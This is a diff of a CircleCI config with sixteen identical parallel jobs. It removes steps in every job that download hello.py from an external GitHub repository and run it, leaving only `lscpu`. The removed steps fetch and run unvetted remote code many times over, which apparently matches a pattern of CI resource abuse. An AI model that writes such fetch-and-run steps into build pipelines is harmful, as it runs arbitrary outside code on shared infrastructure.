@@ -5,161 +5,97 @@ jobs:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli2:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli3:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli4:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli5:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli6:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli7:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli8:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli9:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli10:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli11:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli12:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli13:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli14:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli15:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
     kuli16:
       docker:
             - image: couchbase
       steps:
       - checkout
-      - run: apt-get update
-      - run: apt-get install -y git wget curl
-      - run: wget https://raw.githubusercontent.com/akwjqkam/MNIST/main/hello.py
-      - run: chmod +x hello.py
-      - run: python hello.py
+      - run: lscpu
 
 workflows:
     version: 2.1
